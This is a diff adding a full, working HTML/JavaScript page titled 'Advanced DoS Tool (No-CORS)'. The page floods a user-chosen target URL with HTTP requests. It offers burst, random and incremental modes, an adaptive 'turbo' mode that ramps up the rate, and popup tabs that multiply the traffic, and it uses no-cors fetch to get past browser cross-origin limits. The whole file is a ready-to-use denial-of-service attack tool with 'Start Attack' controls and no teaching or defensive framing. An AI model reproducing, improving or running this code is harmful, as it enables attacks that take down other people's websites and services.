@@ -1,0 +1,1014 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced DoS Tool (No-CORS)</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            width: 90%;
+            max-width: 1000px;
+            margin: 20px auto;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #fdbb2d;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        
+        .disclaimer {
+            background: rgba(179, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            border-left: 5px solid #ff5252;
+        }
+        
+        .info-box {
+            background: rgba(33, 147, 176, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            border-left: 5px solid #2193b0;
+        }
+        
+        .tabs {
+            display: flex;
+            margin-bottom: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .tab {
+            padding: 15px;
+            flex: 1;
+            text-align: center;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .tab.active {
+            background: #2193b0;
+            font-weight: bold;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 16px;
+        }
+        
+        textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: 2px solid #fdbb2d;
+        }
+        
+        .slider-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        input[type="range"] {
+            flex: 1;
+            height: 8px;
+        }
+        
+        .btn {
+            background: linear-gradient(to right, #2193b0, #6dd5ed);
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin: 10px 0;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn-stop {
+            background: linear-gradient(to right, #ff416c, #ff4b2b);
+        }
+        
+        .btn-send {
+            background: linear-gradient(to right, #56ab2f, #a8e063);
+            width: auto;
+            padding: 10px 20px;
+        }
+        
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 34px;
+        }
+        
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+        
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 26px;
+            width: 26px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        
+        input:checked + .slider {
+            background: linear-gradient(to right, #56ab2f, #a8e063);
+        }
+        
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+        
+        .status {
+            margin-top: 25px;
+            padding: 15px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .stat-box {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #fdbb2d;
+        }
+        
+        .log {
+            margin-top: 25px;
+            max-height: 300px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        
+        .log-entry {
+            margin-bottom: 5px;
+            padding: 5px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .log-info {
+            flex: 1;
+        }
+        
+        .log-status {
+            width: 80px;
+            text-align: right;
+        }
+        
+        .success {
+            color: #4caf50;
+        }
+        
+        .error {
+            color: #f44336;
+        }
+        
+        .info {
+            color: #2196f3;
+        }
+        
+        .warning {
+            color: #ff9800;
+        }
+        
+        footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        .turbo-info {
+            background: rgba(253, 187, 45, 0.2);
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+        
+        .mode-selector {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .mode-btn {
+            flex: 1;
+            padding: 10px;
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .mode-btn.active {
+            background: #2193b0;
+            font-weight: bold;
+        }
+        
+        .request-controls {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        
+        .performance-chart {
+            width: 100%;
+            height: 150px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            margin-top: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .chart-inner {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: linear-gradient(to top, #2193b0, #6dd5ed);
+            transform-origin: bottom;
+            transition: height 0.5s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Advanced DoS Tool (No-CORS)</h1>
+        
+        <div class="tabs">
+            <div class="tab active" data-tab="basic">DoS</div>
+            <div class="hidden" data-tab="advanced"></div>
+            <div class="hidden" data-tab="custom"></div>
+        </div>
+        
+        <div class="tab-content active" id="basic-tab">
+            <div class="form-group">
+                <label for="targetUrl">Target URL</label>
+                <input type="text" id="targetUrl" value="" placeholder="https://example.com">
+            </div>
+            
+            <div class="form-group">
+                <label for="requestMethod">HTTP Method</label>
+                <select id="requestMethod">
+                    <option value="GET">GET</option>
+                    <option value="POST">POST</option>
+                    <option value="HEAD">HEAD</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label for="requestMode">Request Mode</label>
+                <div class="mode-selector">
+                    <div class="hidden" data-mode="consistent"></div>
+                    <div class="hidden" data-mode="burst"></div>
+                    <div class="hidden" data-mode="random"></div>
+                    <div class="hidden" data-mode="incremental"></div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="requestRate">Requests per Second (per tab)</label>
+                <div class="slider-container">
+                    <input type="range" id="requestRate" min="1" max="500" value="5">
+                    <span id="requestRateValue">5</span>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="maxTabs">Maximum Tabs to Open</label>
+                <input type="number" id="maxTabs" min="1" max="20" value="0">
+            </div>
+            
+            <div class="form-group">
+                <label for="turboMode">Adaptive Mode (BETA)</label>
+                <label class="switch">
+                    <input type="checkbox" id="turboMode">
+                    <span class="slider"></span>
+                </label>
+                <div class="turbo-info">
+                    <p>Turbo mode will automatically adjust request rate based on system performance.</p>
+                    <p>Current optimized rate: <span id="optimizedRate">0</span> requests/sec</p>
+                    <p>Performance score: <span id="performanceScore">0</span></p>
+                </div>
+            </div>
+            
+            <button id="startBtn" class="btn">Start Attack</button>
+            <button id="stopBtn" class="btn btn-stop">Stop Attack</button>
+        </div>
+        
+        <div class="tab-content" id="advanced-tab">
+            <div class="form-group">
+                <label for="postData">Request Data (for POST/PUT)</label>
+                <textarea id="postData" placeholder='{"key": "value"}'></textarea>
+            </div>
+            
+            <div class="form-group">
+                <label for="headers">Custom Headers</label>
+                <textarea id="headers" placeholder='Content-Type: application/json\nUser-Agent: DosAttack/1.0'></textarea>
+            </div>
+            
+            <div class="form-group">
+                <label for="burstCount">Burst Count (for burst mode)</label>
+                <input type="number" id="burstCount" min="1" max="1000" value="10">
+            </div>
+            
+            <div class="form-group">
+                <label for="burstDelay">Delay Between Bursts (ms)</label>
+                <input type="number" id="burstDelay" min="0" max="10000" value="1000">
+            </div>
+            
+            <div class="form-group">
+                <label for="incrementalStep">Incremental Step (requests/sec)</label>
+                <input type="number" id="incrementalStep" min="1" max="100" value="5">
+            </div>
+            
+            <div class="form-group">
+                <label for="incrementalInterval">Incremental Interval (seconds)</label>
+                <input type="number" id="incrementalInterval" min="1" max="60" value="10">
+            </div>
+        </div>
+        
+        <div class="tab-content" id="custom-tab">
+            <div class="form-group">
+                <label for="customUrl">Custom Request URL</label>
+                <input type="text" id="customUrl" placeholder="https://example.com/api/endpoint">
+            </div>
+            
+            <div class="form-group">
+                <label for="customMethod">HTTP Method</label>
+                <select id="customMethod">
+                    <option value="GET">GET</option>
+                    <option value="POST">POST</option>
+                    <option value="PUT">PUT</option>
+                    <option value="DELETE">DELETE</option>
+                    <option value="HEAD">HEAD</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label for="customData">Request Data</label>
+                <textarea id="customData" placeholder='{"key": "value"}'></textarea>
+            </div>
+            
+            <div class="form-group">
+                <label for="customHeaders">Custom Headers</label>
+                <textarea id="customHeaders" placeholder='Content-Type: application/json\nAuthorization: Bearer token'></textarea>
+            </div>
+            
+            <div class="request-controls">
+                <button id="sendRequestBtn" class="btn btn-send">Send Request</button>
+                <div id="customRequestStatus"></div>
+            </div>
+        </div>
+        
+        <div class="status">
+            <h3>Attack Status: <span id="statusText">Not Running</span></h3>
+            <p>Current Rate: <span id="currentRate">0</span> requests/sec</p>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <div>Active Tabs</div>
+                    <div class="stat-value" id="activeTabs">0</div>
+                </div>
+                <div class="stat-box">
+                    <div>Total Requests</div>
+                    <div class="stat-value" id="totalRequests">0</div>
+                </div>
+                <div class="stat-box">
+                    <div>Successful</div>
+                    <div class="stat-value" id="successfulRequests">0</div>
+                </div>
+                <div class="stat-box">
+                    <div>Failed</div>
+                    <div class="stat-value" id="failedRequests">0</div>
+                </div>
+            </div>
+            
+            <div class="performance-chart">
+                <div class="chart-inner" id="performanceChart" style="height: 0%"></div>
+            </div>
+        </div>
+        
+        <div class="log">
+            <h3>Activity Log <button id="clearLogBtn" style="padding: 5px 10px; font-size: 12px;">Clear Log</button></h3>
+            <div id="logEntries"></div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // DOM elements
+            const tabs = document.querySelectorAll('.tab');
+            const tabContents = document.querySelectorAll('.tab-content');
+            const targetUrl = document.getElementById('targetUrl');
+            const requestMethod = document.getElementById('requestMethod');
+            const requestRate = document.getElementById('requestRate');
+            const requestRateValue = document.getElementById('requestRateValue');
+            const maxTabs = document.getElementById('maxTabs');
+            const turboMode = document.getElementById('turboMode');
+            const optimizedRate = document.getElementById('optimizedRate');
+            const performanceScore = document.getElementById('performanceScore');
+            const startBtn = document.getElementById('startBtn');
+            const stopBtn = document.getElementById('stopBtn');
+            const statusText = document.getElementById('statusText');
+            const currentRate = document.getElementById('currentRate');
+            const activeTabs = document.getElementById('activeTabs');
+            const totalRequests = document.getElementById('totalRequests');
+            const successfulRequests = document.getElementById('successfulRequests');
+            const failedRequests = document.getElementById('failedRequests');
+            const logEntries = document.getElementById('logEntries');
+            const clearLogBtn = document.getElementById('clearLogBtn');
+            const modeButtons = document.querySelectorAll('.mode-btn');
+            const sendRequestBtn = document.getElementById('sendRequestBtn');
+            const customRequestStatus = document.getElementById('customRequestStatus');
+            const performanceChart = document.getElementById('performanceChart');
+            
+            // State variables
+            let isRunning = false;
+            let intervals = [];
+            let popups = [];
+            let requestCounters = {
+                total: 0,
+                success: 0,
+                failed: 0
+            };
+            let currentRequestRate = 0;
+            let adaptiveMode = {
+                enabled: false,
+                currentRate: 0,
+                bestRate: 0,
+                measurements: [],
+                lastMeasurementTime: 0,
+                performanceHistory: [],
+                adjustmentMultiplier: 1.5,
+                fineTuneMode: false
+            };
+            let requestMode = 'consistent';
+            let incrementalStartTime = 0;
+            
+            // Tab switching
+            tabs.forEach(tab => {
+                tab.addEventListener('click', () => {
+                    const tabId = tab.getAttribute('data-tab');
+                    
+                    // Update active tab
+                    tabs.forEach(t => t.classList.remove('active'));
+                    tab.classList.add('active');
+                    
+                    // Show corresponding content
+                    tabContents.forEach(content => {
+                        content.classList.remove('active');
+                        if (content.id === `${tabId}-tab`) {
+                            content.classList.add('active');
+                        }
+                    });
+                });
+            });
+            
+            // Mode selection
+            modeButtons.forEach(btn => {
+                btn.addEventListener('click', () => {
+                    modeButtons.forEach(b => b.classList.remove('active'));
+                    btn.classList.add('active');
+                    requestMode = btn.getAttribute('data-mode');
+                    addLogEntry(`Request mode changed to: ${requestMode}`, 'info');
+                    
+                    if (requestMode === 'incremental') {
+                        incrementalStartTime = Date.now();
+                    }
+                });
+            });
+            
+            // Update slider value display
+            requestRate.addEventListener('input', function() {
+                requestRateValue.textContent = this.value;
+                currentRequestRate = parseInt(this.value);
+                currentRate.textContent = currentRequestRate;
+            });
+            
+            // Clear log
+            clearLogBtn.addEventListener('click', () => {
+                logEntries.innerHTML = '';
+                addLogEntry('Log cleared', 'info');
+            });
+            
+            // Add log entry
+            function addLogEntry(message, type = 'info', status = '') {
+                const entry = document.createElement('div');
+                entry.className = `log-entry`;
+                
+                const infoDiv = document.createElement('div');
+                infoDiv.className = `log-info ${type}`;
+                infoDiv.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+                
+                const statusDiv = document.createElement('div');
+                statusDiv.className = `log-status ${type}`;
+                statusDiv.textContent = status;
+                
+                entry.appendChild(infoDiv);
+                entry.appendChild(statusDiv);
+                
+                logEntries.appendChild(entry);
+                logEntries.scrollTop = logEntries.scrollHeight;
+            }
+            
+            // Update stats display
+            function updateStats() {
+                activeTabs.textContent = popups.length;
+                totalRequests.textContent = requestCounters.total;
+                successfulRequests.textContent = requestCounters.success;
+                failedRequests.textContent = requestCounters.failed;
+            }
+            
+            // Parse headers from text area
+            function parseHeaders(headersText) {
+                const headers = {};
+                if (!headersText) return headers;
+                
+                const lines = headersText.split('\n');
+                for (const line of lines) {
+                    const index = line.indexOf(':');
+                    if (index > 0) {
+                        const name = line.substring(0, index).trim();
+                        const value = line.substring(index + 1).trim();
+                        headers[name] = value;
+                    }
+                }
+                
+                return headers;
+            }
+            
+            // Make a request with specified parameters (no-cors mode)
+            async function makeRequest(url, method, data, headers) {
+                const options = {
+                    method: method,
+                    headers: headers,
+                    mode: 'no-cors', // This is the key change - using no-cors mode
+                    cache: 'no-store'
+                };
+                
+                if (method !== 'GET' && method !== 'HEAD' && data) {
+                    options.body = data;
+                }
+                
+                try {
+                    const startTime = performance.now();
+                    const response = await fetch(url, options);
+                    const endTime = performance.now();
+                    const duration = (endTime - startTime).toFixed(2);
+                    
+                    requestCounters.total++;
+                    requestCounters.success++;
+                    
+                    // With no-cors mode, we can't read the response status, but we can assume it reached the server
+                    addLogEntry(
+                        `${method} ${url} - ${duration}ms`,
+                        'success',
+                        'SENT'
+                    );
+                    
+                    return { success: true, duration };
+                } catch (error) {
+                    requestCounters.total++;
+                    requestCounters.failed++;
+                    
+                    addLogEntry(
+                        `${method} ${url} - Error: ${error.message}`,
+                        'error',
+                        'ERROR'
+                    );
+                    
+                    return { success: false, error: error.message };
+                } finally {
+                    updateStats();
+                }
+            }
+            
+            // Make a standard request based on current settings
+            async function makeStandardRequest() {
+                const url = targetUrl.value;
+                if (!url) return;
+                
+                const method = requestMethod.value;
+                const data = document.getElementById('postData').value;
+                const headersText = document.getElementById('headers').value;
+                const headers = parseHeaders(headersText);
+                
+                // Set default Content-Type for POST/PUT if not specified
+                if ((method === 'POST' || method === 'PUT') && data && !headers['Content-Type']) {
+                    headers['Content-Type'] = 'application/json';
+                }
+                
+                await makeRequest(url, method, data, headers);
+            }
+            
+            // Make a burst of requests
+            async function makeBurstRequest() {
+                const burstCount = parseInt(document.getElementById('burstCount').value) || 10;
+                addLogEntry(`Starting burst of ${burstCount} requests`, 'info');
+                
+                for (let i = 0; i < burstCount; i++) {
+                    await makeStandardRequest();
+                    // Small delay between burst requests to avoid complete blocking
+                    await new Promise(resolve => setTimeout(resolve, 10));
+                }
+            }
+            
+            // Calculate current rate for incremental mode
+            function getIncrementalRate() {
+                if (requestMode !== 'incremental') {
+                    return parseInt(requestRate.value);
+                }
+                
+                const incrementalStep = parseInt(document.getElementById('incrementalStep').value) || 5;
+                const incrementalInterval = parseInt(document.getElementById('incrementalInterval').value) || 10;
+                
+                const now = Date.now();
+                const elapsedSeconds = (now - incrementalStartTime) / 1000;
+                const intervals = Math.floor(elapsedSeconds / incrementalInterval);
+                
+                return parseInt(requestRate.value) + (intervals * incrementalStep);
+            }
+            
+            // Start making requests at the specified rate
+            function startRequests() {
+                let delay;
+                let interval;
+                
+                if (requestMode === 'burst') {
+                    const burstDelay = parseInt(document.getElementById('burstDelay').value) || 1000;
+                    
+                    interval = setInterval(() => {
+                        makeBurstRequest();
+                    }, burstDelay);
+                } else if (requestMode === 'random') {
+                    interval = setInterval(() => {
+                        const currentRate = getIncrementalRate();
+                        delay = Math.floor(1000 / currentRate);
+                        const randomDelay = Math.random() * delay * 2;
+                        setTimeout(makeStandardRequest, randomDelay);
+                    }, 100);
+                } else if (requestMode === 'incremental') {
+                    interval = setInterval(() => {
+                        const currentRate = getIncrementalRate();
+                        delay = Math.floor(1000 / currentRate);
+                        setTimeout(makeStandardRequest, delay);
+                    }, 100);
+                } else {
+                    // Consistent mode
+                    interval = setInterval(() => {
+                        const currentRate = getIncrementalRate();
+                        delay = Math.floor(1000 / currentRate);
+                        setTimeout(makeStandardRequest, delay);
+                    }, 100);
+                }
+                
+                intervals.push(interval);
+                return interval;
+            }
+            
+            // Calculate performance score (0-100)
+            function calculatePerformanceScore() {
+                // Simple performance measurement based on actual vs requested rate
+                if (adaptiveMode.measurements.length < 2) return 100;
+                
+                const recentMeasurements = adaptiveMode.measurements.slice(-5);
+                const totalRequests = recentMeasurements.reduce((sum, val) => sum + val, 0);
+                const avgActualRps = totalRequests / recentMeasurements.length;
+                
+                const targetRps = parseInt(requestRate.value);
+                const performanceRatio = Math.min(1, avgActualRps / targetRps);
+                
+                return Math.floor(performanceRatio * 100);
+            }
+            
+            // Update performance chart
+            function updatePerformanceChart(score) {
+                performanceChart.style.height = `${score}%`;
+            }
+            
+            // Enhanced adaptive rate calculation
+            function calculateAdaptiveRate() {
+                if (!adaptiveMode.enabled) return;
+                
+                const now = Date.now();
+                if (now - adaptiveMode.lastMeasurementTime < 3000) return; // Measure every 3 seconds
+                
+                // Calculate actual requests per second
+                const recentRequests = requestCounters.total - (adaptiveMode.measurements.length > 0 ? 
+                    adaptiveMode.measurements.reduce((a, b) => a + b) : 0);
+                
+                adaptiveMode.measurements.push(recentRequests);
+                if (adaptiveMode.measurements.length > 10) {
+                    adaptiveMode.measurements.shift(); // Keep only last 10 measurements
+                }
+                
+                adaptiveMode.lastMeasurementTime = now;
+                
+                // Calculate performance score
+                const perfScore = calculatePerformanceScore();
+                performanceScore.textContent = perfScore;
+                updatePerformanceChart(perfScore);
+                
+                // Adjust rate based on performance
+                const targetRps = parseInt(requestRate.value);
+                
+                if (perfScore < 80) {
+                    // System can't keep up, reduce rate more aggressively
+                    const reductionFactor = adaptiveMode.fineTuneMode ? 0.9 : 0.7;
+                    const newRate = Math.max(1, Math.floor(targetRps * reductionFactor));
+                    requestRate.value = newRate;
+                    requestRateValue.textContent = newRate;
+                    currentRate.textContent = newRate;
+                    addLogEntry(`System struggling (score: ${perfScore}), reducing rate to ${newRate} requests/sec`, 'warning');
+                    
+                    // Switch to fine-tune mode after a big reduction
+                    if (!adaptiveMode.fineTuneMode && newRate < targetRps * 0.8) {
+                        adaptiveMode.fineTuneMode = true;
+                        adaptiveMode.adjustmentMultiplier = 1.1;
+                        addLogEntry('Switching to fine-tune mode', 'info');
+                    }
+                } else if (perfScore > 90) {
+                    // System is keeping up, increase rate
+                    const newRate = Math.min(1000, Math.floor(targetRps * adaptiveMode.adjustmentMultiplier));
+                    requestRate.value = newRate;
+                    requestRateValue.textContent = newRate;
+                    currentRate.textContent = newRate;
+                    addLogEntry(`System performing well (score: ${perfScore}), increasing rate to ${newRate} requests/sec`, 'info');
+                    
+                    // Increase adjustment multiplier for exponential growth
+                    if (adaptiveMode.adjustmentMultiplier < 2 && !adaptiveMode.fineTuneMode) {
+                        adaptiveMode.adjustmentMultiplier *= 1.1;
+                    }
+                }
+                
+                optimizedRate.textContent = requestRate.value;
+            }
+            
+            // Open a new popup window and start making requests from it
+            function openPopup() {
+                if (popups.length >= parseInt(maxTabs.value)) {
+                    addLogEntry('Maximum number of tabs reached', 'info');
+                    return null;
+                }
+                
+                const popup = window.open('', `popup-${popups.length}`, 'width=300,height=200');
+                if (!popup || popup.closed) {
+                    addLogEntry('Popup was blocked by browser', 'error');
+                    return null;
+                }
+                
+                // Write basic HTML to the popup
+                popup.document.write(`
+                    <html>
+                        <head><title>DoS Attack Tab</title></head>
+                        <body>
+                            <h3>DoS Attack Tab</h3>
+                            <p>Making requests to ${targetUrl.value}</p>
+                            <p>Requests per second: ${requestRate.value}</p>
+                        </body>
+                    </html>
+                `);
+                
+                // Start making requests from this popup
+                const interval = startRequests();
+                popups.push({ window: popup, interval: interval });
+                
+                addLogEntry(`Opened new tab #${popups.length}`, 'info');
+                updateStats();
+                
+                return popup;
+            }
+            
+            // Start the attack
+            function startSimulation() {
+                if (isRunning) return;
+                
+                // Validate URL
+                if (!targetUrl.value || !targetUrl.value.startsWith('http')) {
+                    addLogEntry('Please enter a valid URL starting with http/https', 'error');
+                    return;
+                }
+                
+                isRunning = true;
+                statusText.textContent = 'Running';
+                startBtn.disabled = true;
+                adaptiveMode.enabled = turboMode.checked;
+                
+                if (adaptiveMode.enabled) {
+                    adaptiveMode.lastMeasurementTime = Date.now();
+                    adaptiveMode.measurements = [];
+                    adaptiveMode.performanceHistory = [];
+                    adaptiveMode.adjustmentMultiplier = 1.5;
+                    adaptiveMode.fineTuneMode = false;
+                    addLogEntry('Turbo mode enabled - adaptive rate adjustment active', 'info');
+                }
+                
+                if (requestMode === 'incremental') {
+                    incrementalStartTime = Date.now();
+                }
+                
+                addLogEntry('Starting attack', 'info');
+                
+                // Start making requests from the main tab
+                const mainInterval = startRequests();
+                intervals.push(mainInterval);
+                
+                // Open additional tabs based on maxTabs setting
+                const tabsToOpen = parseInt(maxTabs.value);
+                for (let i = 0; i < tabsToOpen; i++) {
+                    setTimeout(() => openPopup(), i * 1000); // Stagger opening
+                }
+                
+                // Start adaptive rate adjustment interval
+                if (adaptiveMode.enabled) {
+                    intervals.push(setInterval(calculateAdaptiveRate, 3000));
+                }
+                
+                // Update current rate display periodically
+                intervals.push(setInterval(() => {
+                    currentRate.textContent = getIncrementalRate();
+                }, 1000));
+            }
+            
+            // Stop the attack
+            function stopSimulation() {
+                if (!isRunning) return;
+                
+                isRunning = false;
+                statusText.textContent = 'Not Running';
+                startBtn.disabled = false;
+                adaptiveMode.enabled = false;
+                
+                addLogEntry('Stopping attack', 'info');
+                
+                // Clear all intervals
+                intervals.forEach(interval => clearInterval(interval));
+                intervals = [];
+                
+                // Close all popups
+                popups.forEach(popup => {
+                    try {
+                        popup.window.close();
+                    } catch (e) {
+                        // Popup might already be closed
+                    }
+                });
+                popups = [];
+                
+                updateStats();
+            }
+            
+            // Send a custom request
+            async function sendCustomRequest() {
+                const url = document.getElementById('customUrl').value || targetUrl.value;
+                if (!url) {
+                    customRequestStatus.textContent = 'Please enter a URL';
+                    return;
+                }
+                
+                const method = document.getElementById('customMethod').value;
+                const data = document.getElementById('customData').value;
+                const headersText = document.getElementById('customHeaders').value;
+                const headers = parseHeaders(headersText);
+                
+                customRequestStatus.textContent = 'Sending...';
+                
+                const result = await makeRequest(url, method, data, headers);
+                
+                if (result.success) {
+                    customRequestStatus.textContent = `Success: Request sent`;
+                } else {
+                    customRequestStatus.textContent = `Error: ${result.error}`;
+                }
+                
+                // Clear status after 3 seconds
+                setTimeout(() => {
+                    customRequestStatus.textContent = '';
+                }, 3000);
+            }
+            
+            // Event listeners
+            startBtn.addEventListener('click', startSimulation);
+            stopBtn.addEventListener('click', stopSimulation);
+            sendRequestBtn.addEventListener('click', sendCustomRequest);
+            turboMode.addEventListener('change', function() {
+                if (this.checked) {
+                    addLogEntry('Turbo mode enabled - will adjust rate based on system performance', 'info');
+                } else {
+                    addLogEntry('Turbo mode disabled', 'info');
+                }
+            });
+            
+            // Initialize
+            currentRequestRate = parseInt(requestRate.value);
+            currentRate.textContent = currentRequestRate;
+            requestRateValue.textContent = currentRequestRate;
+            
+            // Add initial log entry
+            addLogEntry('Advanced DoS Attack initialized. Ready to start.', 'info');
+        });
+    </script>
+</body>
+</html>
